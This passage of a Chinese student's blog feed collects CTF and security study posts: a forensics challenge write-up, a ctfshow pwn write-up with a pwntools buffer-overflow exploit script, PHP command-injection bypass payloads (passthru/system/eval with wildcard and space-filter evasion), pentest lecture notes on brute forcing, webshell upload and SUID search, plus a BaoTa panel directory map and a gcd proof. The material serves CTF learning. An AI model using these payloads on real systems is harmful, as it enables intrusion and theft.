class="line">WHERE</span><br><span class="line">l.time &lt; datetime(&#x27;2025-04-14&#x27;)</span><br><span class="line">AND ip.city &lt;&gt; u.reg_city</span><br><span class="line">AND NOT (u)-[:TRUSTS]-&gt;(d)</span><br><span class="line">WITH</span><br><span class="line">u,</span><br><span class="line">collect(DISTINCT ip.city) AS 异常登录城市列表,</span><br><span class="line">collect(DISTINCT d.device_id) AS 未授权设备列表,</span><br><span class="line">count(l) AS 异常登录次数</span><br><span class="line">WHERE size(异常登录城市列表) &gt; 2</span><br><span class="line">RETURN</span><br><span class="line">u.user_id AS 用户ID,</span><br><span class="line">u.real_name AS 姓名,</span><br><span class="line">异常登录城市列表,</span><br><span class="line">未授权设备列表, 异常登录次数</span><br><span class="line">ORDER BY 异常登录次数 DESC;</span><br></pre></td></tr></table></figure><h4 id="18-分析起早王的计算机检材，起早王的虚拟货币钱包是什么-格式：0x11111111"><a class="header-anchor" href="#18-分析起早王的计算机检材，起早王的虚拟货币钱包是什么-格式：0x11111111">¶</a>18. 分析起早王的计算机检材，起早王的虚拟货币钱包是什么(格式：0x11111111)</h4><ul><li>浏览器历史记录-最近关闭-metamask</li><li>重置密码是卡死的，但不需要重置上面也有地址：0xd8786a1345cA969C792d9328f8594981066482e9</li></ul><h4 id="注意SHA256格式：字母大小写"><a class="header-anchor" href="#注意SHA256格式：字母大小写">¶</a>注意SHA256格式：字母大小写</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">uppercase_to_lowercase</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> text.lower()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">original_string = <span class="built_in">input</span>(<span class="string">&quot;输入：&quot;</span>)</span><br><span class="line">result = uppercase_to_lowercase(original_string)</span><br><span class="line"><span class="built_in">print</span>(result)  </span><br></pre></td></tr></table></figure><h4 id="19-分析起早王的计算机检材，起早王请高手为倩倩发行了虚拟货币，请问倩倩币的最大供应量是多少-格式：100qianqian"><a class="header-anchor" href="#19-分析起早王的计算机检材，起早王请高手为倩倩发行了虚拟货币，请问倩倩币的最大供应量是多少-格式：100qianqian">¶</a>19. 分析起早王的计算机检材，起早王请高手为倩倩发行了虚拟货币，请问倩倩币的最大供应量是多少(格式：100qianqian)</h4><p><img src="/img/2025%E5%B9%B3%E8%88%AA%E6%9D%AF%E7%BB%93%E5%90%88SPC%E5%87%BA%E9%A2%98_image.png" alt="alt text"><br><img src="/img/2025%E5%B9%B3%E8%88%AA%E6%9D%AF%E7%BB%93%E5%90%88SPC%E5%87%BA%E9%A2%98_image-1.png" alt="alt text"></p><h3 id="AI题目（注意：该题目要python-3-10环境，建议3-10-6）"><a class="header-anchor" href="#AI题目（注意：该题目要python-3-10环境，建议3-10-6）">¶</a>AI题目（注意：该题目要python 3.10环境，建议3.10.6）</h3><h4 id="22-分析crack文件，获得flag1-格式：flag1-123456"><a class="header-anchor" href="#22-分析crack文件，获得flag1-格式：flag1-123456">¶</a>22.分析crack文件，获得flag1(格式：flag1{123456})</h4><ul><li>使用github开源软件解密，<a href="https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases">下载位置</a>，<a href="/2025/10/21/PyArmor-Unpacker%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">使用方法</a><br>cherrystudio</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-pwn合集wp</title>
      <link href="/2025/10/15/ctfshow-pwn%E5%90%88%E9%9B%86wp/"/>
      <url>/2025/10/15/ctfshow-pwn%E5%90%88%E9%9B%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="pwn0【待】"><a class="header-anchor" href="#pwn0【待】">¶</a>pwn0【待】</h4><p><img src="/img/ctfshow-pwn%E5%90%88%E9%9B%86wp_s-1.png" alt="alt text"></p><ul><li>通过打开容器后获得命令，在finalshell通过手动输入信息成功ssh连上</li><li>注意：虚拟机开启NAT模式才能连上，更改模式后重启才生效<br><img src="/img/ctfshow-pwn%E5%90%88%E9%9B%86wp_s-2.png" alt="alt text"></li><li>pwd指令查看当前目录</li><li>ls发现当前目录下没东西</li><li>cd /回到上一级目录</li><li>ls发现当前目录下有文件ctfshow_flag</li><li>cat ctfshow_flag得到 flag</li></ul><h4 id="pwn1"><a class="header-anchor" href="#pwn1">¶</a>pwn1</h4><ul><li>chmod 777 pwn给附件加权限</li><li>checksec pwn查看附件信息，64 位<br><img src="/img/ctfshow-pwn%E5%90%88%E9%9B%86wp_s-3.png" alt="alt text"></li><li>wp要ida看但其实试运行一遍还有题目都提示nc链接，容器给的命令直接复制黏贴就好了<br><img src="/img/ctfshow-pwn%E5%90%88%E9%9B%86wp_s-4.png" alt="alt text"></li></ul><h4 id="pwn2"><a class="header-anchor" href="#pwn2">¶</a>pwn2</h4><ul><li>加权限-查信息-运行-nc连接-shell输入代码</li><li>system(bin/sh)就是给shell？？</li></ul><h4 id="pwn4"><a class="header-anchor" href="#pwn4">¶</a>pwn4</h4><p><img src="/img/ctfshow-pwn%E5%90%88%E9%9B%86wp_s-5.png" alt="alt text"></p><ul><li>反编译程序理解-shell获得</li></ul><h4 id="pwn40"><a class="header-anchor" href="#pwn40">¶</a>pwn40</h4><ul><li><a href="https://blog.csdn.net/Myon5/article/details/138152238?spm=1001.2101.3001.10796">参考1</a>；<a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">参考2</a>；参考3：sq-wp</li><li>目前进度：仅复刻</li><li>注意：exp.py有基于容器修改点</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;152.32.191.198&#x27;</span>, <span class="number">33778</span>) <span class="comment"># 容器域名+端口</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(<span class="number">0x4007e3</span>) + p64(<span class="number">0x400808</span>) + p64(<span class="number">0x4004fe</span>) + p64(<span class="number">0x400520</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># 152.32.191.198:33778</span></span><br></pre></td></tr></table></figure><h4 id="pwn46"><a class="header-anchor" href="#pwn46">¶</a>pwn46</h4>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宝塔面板知识点</title>
      <link href="/2025/10/13/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2025/10/13/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h4 id="宝塔目录结构框架————来源"><a class="header-anchor" href="#宝塔目录结构框架————来源">¶</a>宝塔目录结构框架————<a href="https://www.kancloud.cn/microcloud/btcn/1507255">来源</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/</span><br><span class="line">├── backup  -----------------------------------&gt;宝塔面板的备份文件目录          </span><br><span class="line">│   ├── database------------------------------&gt;宝塔面板的数据库备份目录</span><br><span class="line">│   ├── panel---------------------------------&gt;宝塔面板配置自动备份目录（6.9.32版本新添加）</span><br><span class="line">│   │   └── 2019-10-16-----------------------&gt;宝塔面板配置自动备份的文件，默认是以年月日格式备份，数量为15天</span><br><span class="line">│   └── site----------------------------------&gt;宝塔面板站点备份目录</span><br><span class="line">├── server-------------------------------------&gt;宝塔面板服务目录（比较关键）</span><br><span class="line">│   ├── data----------------------------------&gt;mysql数据库服务的目录</span><br><span class="line">├── xindb.cn.err-----------------------&gt;数据库错误日志文件（比较重要，数据库启动不了可以将此日志文件打开，找到最新的日志发给DBA进行分析错误）</span><br><span class="line">├── xindb.cn.pid-----------------------&gt;存放数据库pid的文件</span><br><span class="line">│   ├── nginx---------------------------------&gt;nginx的主目录</span><br><span class="line">│   │   ├── client_body_temp</span><br><span class="line">│   │   ├── conf-----------------------------&gt;nginx的默认配置目录</span><br><span class="line">│   │   ├── fastcgi_temp</span><br><span class="line">│   │   ├── html</span><br><span class="line">│   │   │   ├── 50x.html</span><br><span class="line">│   │   │   └── index.html</span><br><span class="line">│   │   ├── logs-----------------------------&gt;nginx的日志目录</span><br><span class="line">│   │   │   ├── error.log</span><br><span class="line">│   │   │   └── nginx.pid</span><br><span class="line">│   │   ├── off</span><br><span class="line">│   │   ├── proxy_cache_dir</span><br><span class="line">│   │   ├── proxy_temp_dir</span><br><span class="line">│   │   ├── rpm.pl</span><br><span class="line">│   │   ├── sbin</span><br><span class="line">│   │   │   └── nginx-----------------------&gt;nginx的启动文件</span><br><span class="line">│   │   ├── scgi_temp</span><br><span class="line">│   │   ├── uwsgi_temp</span><br><span class="line">│   │   ├── version.pl</span><br><span class="line">│   │   └── waf</span><br><span class="line">│   │       ├── config.lua</span><br><span class="line">│   │       ├── init.lua</span><br><span class="line">│   │       └── waf.lua</span><br><span class="line">│   ├── panel---------------------------------&gt;面板文件目录（最为重要）</span><br><span class="line">│   │   ├── BTPanel</span><br><span class="line">│   │   ├── class</span><br><span class="line">│   │   ├── config</span><br><span class="line">│   │   ├── data</span><br><span class="line">│   │   ├── default.pl</span><br><span class="line">│   │   ├── init.sh</span><br><span class="line">│   │   ├── install--------------------------&gt;面板软件安装脚本路径</span><br><span class="line">│   │   │   ├── install_soft.sh</span><br><span class="line">│   │   │   ├── lib.sh</span><br><span class="line">│   │   │   ├── mysql.sh</span><br><span class="line">│   │   │   ├── nginx.sh</span><br><span class="line">│   │   │   ├── phpmyadmin.sh</span><br><span class="line">│   │   │   ├── php.sh</span><br><span class="line">│   │   │   ├── public.sh-------------------&gt;安装软件主脚本</span><br><span class="line">│   │   │   └── pureftpd.sh</span><br><span class="line">│   │   ├── license.txt</span><br><span class="line">│   │   ├── logs------------------------------&gt;面板日志存放目录</span><br><span class="line">│   │   │   ├── access.log-------------------&gt;面板访问日志文件</span><br><span class="line">│   │   │   ├── certbot.log</span><br><span class="line">│   │   │   ├── error.log--------------------&gt;面板错误日志文件</span><br><span class="line">（面板打不开或者软件安装不了，可以打开这个文件将最新的日志信息发到宝塔论坛）</span><br><span class="line">│   │   │   ├── panel.pid</span><br><span class="line">│   │   │   ├── request</span><br><span class="line">│   │   │   │   └── 2019-10-16.json</span><br><span class="line">│   │   │   └── task.log</span><br><span class="line">│   │   ├── rewrite---------------------------&gt;伪静态存放目录</span><br><span class="line">│   │   │   ├── apache-----------------------&gt;apache默认的伪静态规则目录</span><br><span class="line">│   │   │   │   ├── dedecms.conf</span><br><span class="line">│   │   │   │   ├── default.conf</span><br><span class="line">│   │   │   │   ├── discuzx2.conf</span><br><span class="line">│   │   │   │   ├── discuzx3.conf</span><br><span class="line">│   │   │   │   ├── discuzx.conf</span><br><span class="line">│   │   │   │   ├── ecshop.conf</span><br><span class="line">│   │   │   │   ├── EmpireCMS.conf</span><br><span class="line">│   │   │   │   ├── list.txt</span><br><span class="line">│   │   │   │   ├── mvc.conf</span><br><span class="line">│   │   │   │   ├── phpcms.conf</span><br><span class="line">│   │   │   │   ├── phpwind.conf</span><br><span class="line">│   │   │   │   ├── thinkphp.conf</span><br><span class="line">│   │   │   │   ├── wordpress.conf</span><br><span class="line">│   │   │   │   └── zblog.conf</span><br><span class="line">│   │   │   └── nginx-------------------------&gt;nginx默认的伪静态规则存放目录</span><br><span class="line">│   │   │       ├── dabr.conf</span><br><span class="line">│   │   │       ├── dbshop.conf</span><br><span class="line">│   │   │       ├── dedecms.conf</span><br><span class="line">│   │   │       ├── default.conf</span><br><span class="line">│   │   │       ├── discuz.conf</span><br><span class="line">│   │   │       ├── discuzx2.conf</span><br><span class="line">│   │   │       ├── discuzx3.conf</span><br><span class="line">│   │   │       ├── discuzx.conf</span><br><span class="line">│   │   │       ├── drupal.conf</span><br><span class="line">│   │   │       ├── ecshop.conf</span><br><span class="line">│   │   │       ├── emlog.conf</span><br><span class="line">│   │   │       ├── EmpireCMS.conf</span><br><span class="line">│   │   │       ├── laravel5.conf</span><br><span class="line">│   │   │       ├── maccms.conf</span><br><span class="line">│   │   │       ├── mvc.conf</span><br><span class="line">│   │   │       ├── niushop.conf</span><br><span class="line">│   │   │       ├── phpcms.conf</span><br><span class="line">│   │   │       ├── phpwind.conf</span><br><span class="line">│   │   │       ├── sablog.conf</span><br><span class="line">│   │   │       ├── seacms.conf</span><br><span class="line">│   │   │       ├── shopex.conf</span><br><span class="line">│   │   │       ├── thinkphp.conf</span><br><span class="line">│   │   │       ├── typecho2.conf</span><br><span class="line">│   │   │       ├── typecho.conf</span><br><span class="line">│   │   │       ├── wordpress.conf</span><br><span class="line">│   │   │       ├── wp2.conf</span><br><span class="line">│   │   │       └── zblog.conf</span><br><span class="line">│   │   ├── runconfig.py</span><br><span class="line">│   │   ├── runserver.py</span><br><span class="line">│   │   ├── runserver.pyc</span><br><span class="line">│   │   ├── script------------------------------&gt;面板计划任务备份脚本目录</span><br><span class="line">│   │   │   ├── backup</span><br><span class="line">│   │   │   ├── backup.py</span><br><span class="line">│   │   │   ├── ftp.sh</span><br><span class="line">│   │   │   ├── GetOS.sh</span><br><span class="line">│   │   │   ├── install.sh</span><br><span class="line">│   │   │   ├── logsBackup</span><br><span class="line">│   │   │   ├── logsBackup.py</span><br><span class="line">│   │   │   └── rememory.sh</span><br><span class="line">│   │   ├── ssl----------------------------------&gt;面板证书目录</span><br><span class="line">│   │   │   ├── certificate.pem</span><br><span class="line">│   │   │   └── privateKey.pem</span><br><span class="line">│   │   ├── task.py</span><br><span class="line">│   │   ├── tmp</span><br><span class="line">│   │   ├── tools.py</span><br><span class="line">│   │   ├── tools.pyc</span><br><span class="line">│   │   └── vhost--------------------------------&gt;站点配置文件目录</span><br><span class="line">│   │       ├── apache---------------------------&gt;apache 站点配置文件目录</span><br><span class="line">│   │       │   ├── 0.default.conf</span><br><span class="line">│   │       │   └── xindb.cn.conf</span><br><span class="line">│   │       ├── cert-----------------------------&gt;站点证书目录</span><br><span class="line">│   │       ├── nginx----------------------------&gt;nginx站点配置文件目录</span><br><span class="line">│   │       │   ├── 0.default.conf</span><br><span class="line">│   │       │   ├── xindb.cn.conf</span><br><span class="line">│   │       │   └── phpfpm_status.conf</span><br><span class="line">│   │       ├── rewrite--------------------------&gt;站点重定向配置文件目录</span><br><span class="line">│   │       │   └── xindb.cn.conf</span><br><span class="line">│   │       ├── template</span><br><span class="line">│   │       │   ├── apache</span><br><span class="line">│   │       │   └── nginx</span><br><span class="line">│   │       │       ├── anti.conf</span><br><span class="line">│   │       │       ├── error_page.conf</span><br><span class="line">│   │       │       ├── other.conf</span><br><span class="line">│   │       │       ├── proxy.conf</span><br><span class="line">│   │       │       ├── redirect.conf</span><br><span class="line">│   │       │       └── ssl.conf</span><br><span class="line">│   │       ├── tomcat----------------------------&gt;tomcat站点配置文件目录</span><br><span class="line">│   │       └── wafconf</span><br><span class="line">│   │           ├── args</span><br><span class="line">│   │           ├── blockip</span><br><span class="line">│   │           ├── cookie</span><br><span class="line">│   │           ├── denycc</span><br><span class="line">│   │           ├── post</span><br><span class="line">│   │           ├── returnhtml</span><br><span class="line">│   │           ├── url</span><br><span class="line">│   │           ├── user-agent</span><br><span class="line">│   │           ├── whiteip</span><br><span class="line">│   │           └── whiteurl</span><br><span class="line">│   ├── php----------------------------------------&gt;php安装目录</span><br><span class="line">│   │   └── 54</span><br><span class="line">│   ├── phpmyadmin</span><br><span class="line">│   ├── pure-ftpd</span><br><span class="line">├── wwwlogs-----------------------------------------&gt;站点日志目录（当站点打不开或者出错，将最新错误日志发到论坛）</span><br><span class="line">│   ├── access.log</span><br><span class="line">│   ├── xindb.cn.error.log</span><br><span class="line">│   ├── xindb.cn.log</span><br><span class="line">│   ├── nginx_error.log</span><br><span class="line">│   └── waf</span><br><span class="line">├── wwwroot-----------------------------------------&gt;站点根目录</span><br><span class="line">│   └── xindb.cn</span><br><span class="line">│       ├── 404.html</span><br><span class="line">│       └── index.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 宝塔 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cty笔记转载</title>
      <link href="/2025/10/10/ctj%E7%AC%94%E8%AE%B0%E8%BD%AC%E8%BD%BD/"/>
      <url>/2025/10/10/ctj%E7%AC%94%E8%AE%B0%E8%BD%AC%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h3 id="命令执行"><a class="header-anchor" href="#命令执行">¶</a>命令执行</h3><ul><li>语句<ul><li>system()<ul><li>执行外部程序(命令行)并返回命令输出的第一行为字符串.</li><li>失败返回 false,如果没有找到命令返回空字符串.</li></ul></li><li>passthru()</li><li>与 system()不同，passthru()直接把命令执行的结果输出到标准输出,而不返回.</li><li>shell_exec()<ul><li>返回输出第一行的内容,无回显.需要反弹 shell 使用.</li></ul></li><li>exec()<ul><li>不回显,返回命令执行的结果.</li></ul></li><li>``<ul><li>在 php 中,反引号&quot;`”是可以执行系统命令的.</li><li>反引号和 shell_exec()等价</li></ul></li></ul></li><li>命令执行<ul><li>解法<ul><li>解法1：passthru<ul><li>?c=passthru(“tac%20fla*”);</li></ul></li></ul></li><li>解法2：绕过*号<ul><li>假如*号被过滤了，我们可以通过?c=passthru(“ls”);</li><li>先获取flag.php是目标，然后再通过？来匹配单个字母，也就是fla???匹配flag.php</li><li>?c=passthru(“tac%20fla???”);</li></ul></li><li>解法3：反字节符配合echo<ul><li>?c=echo(<code>ls</code>);</li><li>?c=echo%20<code>tac%20fla*</code>;</li></ul></li><li>解法4：带参数输入<ul><li>?c=eval($_GET[1]);&amp;1=system(“tac%20flag.php”)；</li><li>1参数逃逸，不属于c，可以使用被ban内容</li><li>web31</li></ul></li><li>解法5：exec<ul><li>echo%20exec(“cat%20f\lag.p\hp”);</li></ul></li><li>解法6：system<ul><li>?c=system(“tac%20fla*”);</li></ul></li><li>解法7：利用cp或mv命令将flag拷贝到别处<ul><li>?c=system(“cp%20fl*g.php%20a.txt%20”);</li><li>然后浏览器访问a.txt，读取即可</li><li>eg. web30</li></ul></li><li>解法8：万能<ul><li>?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</li><li>?c=eval(array_pop(next(get_defined_vars())));</li></ul></li><li>如果;被ban，php代码最后一行可以不用; 然后换成?&gt;就行了</li><li>如果php被ban，可以用短标签</li></ul></li><li>对小数点的限制可以使用通配符*或者占位符？来绕过</li><li>preg_match是正则匹配</li><li>/i : 忽略大小写</li><li>过滤空格，flag：cat$IFS<code>ls</code></li><li>绕过空格过滤：<ul><li>${IFS}$9</li><li>{IFS}</li><li>$IFS</li><li>${IFS}</li><li>IFS</li><li>&lt;</li><li>&lt;&gt;</li><li>{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来</li><li>%09   (tab)</li><li>X=$‘cat\x09./flag.php’;$X       （\x09表示tab，也可以用\x20）</li><li>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</li></ul></li><li>windows 或 linux 下:<ul><li>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</li><li>command1 | command2 只执行 command2</li><li>command1 &amp; command2 先执行 command2 后执行 command1</li><li>command1 || command2 先执行 command1，如果为假，再执行 command2</li><li>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</li></ul></li></ul><h3 id="代码执行"><a class="header-anchor" href="#代码执行">¶</a>代码执行</h3><ul><li>isset()<ul><li>函数返回一个布尔值，如果变量存在且不包含NULL值，则返回TRUE，否则返回FALSE。</li></ul></li><li>eval()<ul><li>代码执行函数,把输入的字符串当作 php 代码执行.</li><li>可以 eval(?&gt;<?php [input]?>[text] &lt;?[p])，也就是用标签声明一段 php代码结束后再声明下一段代码开始</li><li>在函数输入的结尾需要打分号,否则会报 unexpected ending</li></ul></li><li>assert()<ul><li>断言函数 assert(),在 RCE 中可以简单的认为它等同于 eval()</li></ul></li><li>preg_match()<ul><li>如果找到一个匹配，preg_match() 函数返回 1，否则返回 0。</li></ul></li><li>preg_replace()<ul><li>函数执行一个正则表达式的搜索和替换</li></ul></li><li>${}<ul><li>如果出现在字符串里就会被解析,并执行其中的 php 代码</li><li>${}本是用于在字符串中嵌入变量和执行表达式的</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 转载 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPC新生讲座笔记</title>
      <link href="/2025/10/09/%E8%AE%B2%E5%BA%A7%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/09/%E8%AE%B2%E5%BA%A7%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<ul><li>python库踩坑：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure><ul><li><p>sq</p><ul><li>爆破，伪加密，社工，掩码，字典</li><li>pwn<ul><li>看环境，找漏洞，破解</li><li><strong>看环境，然后导入附件之后用checksec –file命令去看保护，比如你发现它没有RX保护就可以在栈上直接执行命令诸如此类</strong>——sq</li></ul></li></ul></li><li><p>hackbar</p><ul><li>SQL：提供三种数据库的sql查询语句，以及一些方便联合查询的语句</li><li>XSS：提供xss攻击语句</li><li>string.fromcharcode()：将根据UNICODE 值来输出xss语句</li><li>html charactor ： 将XSS语句转化为HTML字符实体（以&amp;开头）</li><li>alert(xss) statement : 构建一条xss测试语句，弹出一个框内容为xss，相当于alert(‘xss’);</li><li>Encryption：对所选字符进行加密，提供了MD5，SHA-1，SHA-256，ROT13等加密方式</li><li>Encoding：对所选字符进行编码解码，提供了Base64 Encode,Base64 Decode,URLencode,URLdecode, HEX encoding, HEX decoding等方式</li><li>Other： addslashes：在每个双引号前加反斜杠 stripslashes：除去所选字符中的反斜杠 strip space：除去所选字符中的空格 reverse：将所选字符倒序排列 usefull strings：提供了一些特殊的数值如圆周率PI,斐波那契数列等，其中buffer overflow 可以输入一定长度的字符造成缓存溢出攻击</li></ul></li><li><p>搭建网站</p><ul><li>service apache2 starrt</li><li>python app文件夹</li><li>java 哪里都有可能</li></ul></li><li><p>sudo vim a.php →172…/a.php</p></li><li><p>python搭建 路由</p></li><li><p>渗透</p><ul><li>y0usef可能是用户信息</li><li>前期信息收集</li><li>漏洞点-功能点里找<ul><li>Upload extend/base/找到位置</li></ul></li><li>nmap探活</li><li>NAT模式-虚拟机能够在一个网段</li><li>nmap -sP</li><li>ipconfig</li><li>扫描端口service apache2 start</li><li>3306 33060 mycircle（？？？</li><li>无影（软件</li><li>nmap -p- 192…扫描端口</li><li>pin命令更快，因为window防火墙</li><li>ssh远程连接</li><li>扫版本号信息</li></ul></li><li><p>CVE 0day nday 1day<br>- ↑</p><ul><li>wordpress hexo模板通用漏洞</li><li>apache也有</li></ul></li><li><p>nmap -p加特定端口- -sVC 192.。。</p></li><li><p>kali自带：searchhploid apache 2.4.10</p></li><li><p>sudo find / -name &quot;…py&quot;→漏洞位置？？</p></li><li><p>cat 位置</p></li><li><p>Tomcat java no php?</p></li><li><p>ssh 用finalshell天狐渗透</p></li><li><p>nmap --script=ssh-brute 192…爆破</p></li><li><p>hydra -l …txt noend字典爆破</p></li><li><p>源代码→信息查找</p></li><li><p>dirsearch -u 地址</p></li><li><p>/.dockerfile 放网址后面可能直接得到答案</p></li><li><p>403无权访问 302 301——状态码</p></li><li><p>Forbidden→无法访问状态</p></li><li><p>Burpsuite   代理抓包ctrl+R发送到REsquest  方便查看</p></li><li><p>Burpsuite  拓展Bypass WAF绕过403</p></li><li><p>B  intruder 狙击手<strong>长度</strong>一样-失败  trylogin失败</p></li><li><p>？关键点复制发送绕过去？？？</p></li><li><p>hackbar也可以？？？</p></li><li><p>爆破 sql注入  XXE？？</p></li><li><p>fuzz字典→搜索得到字典文件</p></li><li><p>yakit插件bypass403绕过——200成功</p></li><li><p>intruder-资源池</p></li><li><p>账户admin root 字典-交叉 payload集：2加字典，1输入</p></li><li><p>CSS美化不看</p></li><li><p>上传抓包B  一句话木马 上传失败 限制 找信息变化 文件头文件类型文件长度检测</p></li><li><p>Content-Type（限制描述</p></li><li><p>GIF89a  ??放过去</p></li><li><p>一句话木马</p></li><li><p>&lt;？php @eval&gt;</p></li><li><p>标签</p></li><li><p>request(同时接受request post) post cookie</p></li><li><p>存储cookie</p></li><li><p>中国蚁剑？？（软件</p></li><li><p>右键 虚拟终端-环境变量里</p></li><li><p>yousef形容用户</p></li><li><p>1000<strong>提权</strong>？？</p></li><li><p>Finalshell ssh连接</p></li><li><p>SSTI</p></li><li><p>find / -user root -perm -4000 print 2&gt;/dev/null</p></li><li><p>base64 。。。txt  strings不要用</p></li><li><p>无回显？？</p></li><li><p>awb</p></li></ul><p>电子取证</p><ul><li>计算机，服务器，手机1取证</li><li>exe,数据库，网站，区块链，物联网，流量，内存取证</li><li>conf后缀文件 信息重灾区 一种用于存储软件或系统配置信息的文件格式。</li><li>auth</li></ul><p>电子取证</p><ul><li>方向：计算机取证，服务器取证，⼿机取证<ul><li>exe取证，数据库取证，⽹站取证，区块链取证，物联⽹取证，流量取证，内存取证</li></ul></li><li>工具<ul><li>vmware workstation（虚拟机运⾏），kali linux（linux环境），010editor/winhex（⼗六进制编辑器），vscode/pycharm（代码）</li></ul></li><li>电脑取证：xways forensics</li><li>磁盘：ufs，ftk imager，efdd</li><li>解密：ctool，passwarekit，hashcat，cyberchef</li><li>数据库：dbbrowser，navicat</li><li>内存取证：volatility</li><li>流量取证：wireshark（pcapng），fiddler（saz）</li><li>apk取证：夜神模拟器/雷电模拟器/雷神模拟器，MT管理器，jadx-gui</li><li>服务器取证：xshell/finalshell/xterminal ssh⼯具</li><li>exe取证：沙箱，die，ida，⽕绒</li></ul>]]></content>
      
      
      <categories>
          
          <category> 讲座笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 电子取证 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>扩展欧几里得算法[待]</title>
      <link href="/2025/10/06/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
      <url>/2025/10/06/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>知识递进：</p><ol><li>同余符号：a = b % c ; b ≡ a mod c → <strong>a % c = b % c</strong><br>rsa中应用：c = m ^ e % n ；m ^ e ≡ c mod n</li><li>gcd(a,b)<br>基础算法：for i in range(0,min(a,b)):<br>if a % i == 0 | b % i == 0:<br>return i</li><li>欧几里得算法又称辗转相除法，是指用于计算两个正整数a，b的最大公约数。<br>[此时mod等同于%] gcd(a,b) = gcd(b,a mod b)<br>原理：两个整数的最大公约数等于其中较小的数和两数相除余数的最大公约数。<br>算法：<br>求gcd(a,b)[假设a&gt;b]：<br>a ÷ b = c mod d<br>b ÷ d = e mod f<br>d ÷ f = g mod h<br>if h == 0 → f = gcd(a,b)</li><li>证明：gcd(a,b) = gcd(b,a mod b) (不妨设a＞b 且r=a mod b ,r不为0)</li></ol><ul><li>法一：公约数是最大公约数的因子，得到d = e</li></ul><p><img src="/img/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95_3-5.png" alt="alt text"></p><ul><li>法二(感觉网上这个有点错误，改了下)<br>假设c = gcd(a,b),则存在m,n，使a = mc, b = nc;<br>令r = a mod b，即存在k，a = kb+r, 使r = a-kb = mc - knc = (m-kn)c;<br>故gcd(b,a mod b) = gcd(b,r) = gcd(nc,(m-kn)c) = gcd(n,m-kn)c;<br>则c为b与a mod b的公约数;<br>假设d = gcd(n,m-kn), 则存在x,y, 使n = xd, m-kn = yd; 故m = yd+kn = yd+kxd = (y+kx)d;<br>故有a = mc = (y+kx)dc, b = nc = xdc; 可得 gcd(a,b) = gcd((y+kx)dc,xdc) &gt;= dc;<br>由于gcd(a,b) = c, 【故 c &gt;= dc, d &lt;= 1 ,又d = gcd(n,m-kn)，所以d &gt;= 1, 】<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>综上：d = 1;<br>即gcd(n,m-kn) = 1, 故可得gcd(b,a mod b) = c;<br>故得证gcd(a,b) = gcd(b,a mod b).</li></ul><p><a href="https://baike.baidu.com/item/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/1647675">原解法来源</a></p><p>注释：</p><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>自己删改的部分 <a href="#fnref1" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPC新生讲座题目wp</title>
      <link href="/2025/10/06/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE/"/>
